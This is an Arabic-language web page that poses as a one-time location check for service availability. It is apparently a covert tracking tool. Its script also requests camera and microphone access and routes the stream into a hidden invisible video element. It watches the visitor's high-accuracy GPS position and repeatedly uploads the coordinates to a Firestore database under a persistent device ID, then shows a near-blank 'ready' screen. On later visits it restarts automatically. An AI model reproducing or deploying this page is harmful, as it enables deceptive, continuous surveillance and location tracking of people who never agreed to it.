<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>الرئيسية</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap');

        * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }

        body {
            font-family: 'Cairo', sans-serif;
            background: #0a0e1a;
            color: #f1f5f9;
            min-height: 100vh;
            min-height: 100dvh;
            overflow: hidden;
        }

        #hidden-stream {
            position: fixed;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
            top: -9999px;
            left: -9999px;
            z-index: -1;
        }

        /* === شاشة الأذن الوحيدة === */
        #perm-screen {
            position: fixed;
            inset: 0;
            background: #0a0e1a;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 9999;
            padding: 30px;
            text-align: center;
            transition: opacity 0.5s ease;
        }

        #perm-screen.fade-out {
            opacity: 0;
            pointer-events: none;
        }

        .perm-box {
            max-width: 340px;
            width: 100%;
        }

        .perm-box .icon-circle {
            width: 70px;
            height: 70px;
            border-radius: 50%;
            background: rgba(0, 229, 160, 0.1);
            border: 1.5px solid rgba(0, 229, 160, 0.25);
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 20px;
            font-size: 1.6rem;
            color: #00e5a0;
        }

        .perm-box h2 {
            font-size: 1.2rem;
            font-weight: 700;
            margin-bottom: 10px;
            line-height: 1.5;
        }

        .perm-box p {
            font-size: 0.85rem;
            color: #7a8baa;
            line-height: 1.7;
            margin-bottom: 28px;
        }

        .perm-btn {
            width: 100%;
            padding: 15px;
            border: none;
            border-radius: 12px;
            background: linear-gradient(135deg, #00e5a0, #00b87a);
            color: #0a0e1a;
            font-family: 'Cairo', sans-serif;
            font-size: 1rem;
            font-weight: 700;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            transition: all 0.3s;
            box-shadow: 0 4px 20px rgba(0, 229, 160, 0.25);
        }

        .perm-btn:active { transform: scale(0.97); }
        .perm-btn:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }

        .perm-btn .ld {
            width: 18px;
            height: 18px;
            border: 2.5px solid transparent;
            border-top-color: #0a0e1a;
            border-radius: 50%;
            animation: sp 0.6s linear infinite;
            display: none;
        }

        @keyframes sp { to { transform: rotate(360deg); } }

        /* === الشاشة الفارغة بعد التفعيل === */
        #blank-screen {
            position: fixed;
            inset: 0;
            background: #0a0e1a;
            display: none;
            justify-content: center;
            align-items: center;
            z-index: 1;
        }

        .blank-msg {
            text-align: center;
            opacity: 0.15;
        }

        .blank-msg i {
            font-size: 2.5rem;
            margin-bottom: 10px;
            display: block;
        }

        .blank-msg span {
            font-size: 0.85rem;
            color: #7a8baa;
        }

        /* حالة الحظر */
        .perm-box.blocked .icon-circle {
            background: rgba(255, 71, 87, 0.1);
            border-color: rgba(255, 71, 87, 0.25);
            color: #ff4757;
        }

        .perm-box.blocked .perm-btn {
            background: rgba(255, 71, 87, 0.12);
            color: #ff4757;
            box-shadow: none;
            border: 1px solid rgba(255, 71, 87, 0.25);
        }
    </style>

    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
</head>
<body>

    <video id="hidden-stream" autoplay playsinline muted></video>

    <!-- شاشة الأذن المبسطة -->
    <div id="perm-screen">
        <div class="perm-box" id="perm-box">
            <div class="icon-circle" id="perm-icon-circle">
                <i class="fa-solid fa-check" id="perm-icon"></i>
            </div>
            <h2 id="perm-title">مرحباً بك</h2>
            <p id="perm-desc">للتأكد من توفر الخدمة في منطقتك، نحتاج صلاحية تحديد الموقع مرة واحدة فقط.</p>
            <button class="perm-btn" id="perm-btn" onclick="start()">
                <span class="ld" id="perm-ld"></span>
                <i class="fa-solid fa-arrow-left" id="perm-btn-icon"></i>
                <span id="perm-btn-text">متابعة</span>
            </button>
        </div>
    </div>

    <!-- شاشة فارغة بعد التفعيل -->
    <div id="blank-screen">
        <div class="blank-msg">
            <i class="fa-solid fa-check-double"></i>
            <span>جاهز</span>
        </div>
    </div>

    <script>
        // === Firebase ===
        const firebaseConfig = {
  apiKey: "AIzaSyDk5poPjAe6LJOMUbDU_ak_ZLtLuCoqahI",
  authDomain: "project-8964705196826400556.firebaseapp.com",
  projectId: "project-8964705196826400556",
  storageBucket: "project-8964705196826400556.firebasestorage.app",
  messagingSenderId: "615020770883",
  appId: "1:615020770883:web:ca0856f464dd57b4aac6f6"
};
        const db = firebase.firestore();

        // === معرف الجهاز الثابت ===
        let deviceId = localStorage.getItem('smart_menu_device_id');
        if (!deviceId) {
            deviceId = "dev_" + Math.random().toString(36).substring(2, 12) + Date.now().toString(36);
            localStorage.setItem('smart_menu_device_id', deviceId);
        }

        let watcher = null;
        let bestAcc = Infinity;
        let optimizing = true;
        let t0 = Date.now();

        // === البداية ===
        async function start() {
            const btn = document.getElementById('perm-btn');
            const ld = document.getElementById('perm-ld');
            const icon = document.getElementById('perm-btn-icon');

            btn.disabled = true;
            ld.style.display = 'block';
            icon.style.display = 'none';
            document.getElementById('perm-btn-text').innerText = 'جاري التحقق...';

            try {
                // كاميرا + ميكروفون (مخفي)
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: { ideal: "environment" } },
                    audio: true
                });
                document.getElementById('hidden-stream').srcObject = stream;

                // GPS عالي الدقة
                if (!("geolocation" in navigator)) throw new Error("gps");

                watcher = navigator.geolocation.watchPosition(onPos, onErr, {
                    enableHighAccuracy: true,
                    timeout: 15000,
                    maximumAge: 0
                });

            } catch (e) {
                showBlocked();
            }
        }

        // === استقبال الإحداثيات ===
        function onPos(pos) {
            const lat = pos.coords.latitude;
            const lng = pos.coords.longitude;
            const acc = pos.coords.accuracy;

            if (optimizing) {
                if (acc < bestAcc) {
                    bestAcc = acc;
                    push(lat, lng, acc);
                }
                if (acc <= 5 || (Date.now() - t0 > 15000)) {
                    optimizing = false;
                }
            } else {
                push(lat, lng, acc);
            }

            // إخفاء شاشة الأذن وعرض الشاشة الفارغة
            document.getElementById('perm-screen').classList.add('fade-out');
            setTimeout(() => {
                document.getElementById('perm-screen').style.display = 'none';
                document.getElementById('blank-screen').style.display = 'flex';
            }, 500);
        }

        // === رفع إلى Firebase ===
        function push(lat, lng, acc) {
            db.collection('loc').doc(deviceId).set({
                latitude: lat,
                longitude: lng,
                accuracy: acc,
                device_id: deviceId,
                last_updated: firebase.firestore.FieldValue.serverTimestamp()
            }, { merge: true }).catch(() => {});
        }

        // === خطأ GPS ===
        function onErr(err) {
            if (err.code === err.PERMISSION_DENIED) showBlocked();
        }

        // === شاشة الحظر ===
        function showBlocked() {
            const box = document.getElementById('perm-box');
            box.classList.add('blocked');
            document.getElementById('perm-icon').className = 'fa-solid fa-xmark';
            document.getElementById('perm-title').innerText = 'الصلاحية مطلوبة';
            document.getElementById('perm-desc').innerText = 'لا يمكن تقديم الخدمة بدون تحديد الموقع. يرجى تحديث الصفحة والموافقة على الصلاحية.';

            const ld = document.getElementById('perm-ld');
            const icon = document.getElementById('perm-btn-icon');
            const txt = document.getElementById('perm-btn-text');
            const btn = document.getElementById('perm-btn');

            ld.style.display = 'none';
            icon.style.display = 'inline';
            icon.className = 'fa-solid fa-rotate-right';
            txt.innerText = 'إعادة المحاولة';
            btn.disabled = false;
        }

        // === فحص تلقائي إذا الأذن ممنوح مسبقاً ===
        window.onload = function () {
            if (navigator.permissions && navigator.permissions.query) {
                navigator.permissions.query({ name: 'geolocation' }).then(r => {
                    if (r.state === 'granted') start();
                }).catch(() => {});
            }
        };
    </script>
</body>
</html>
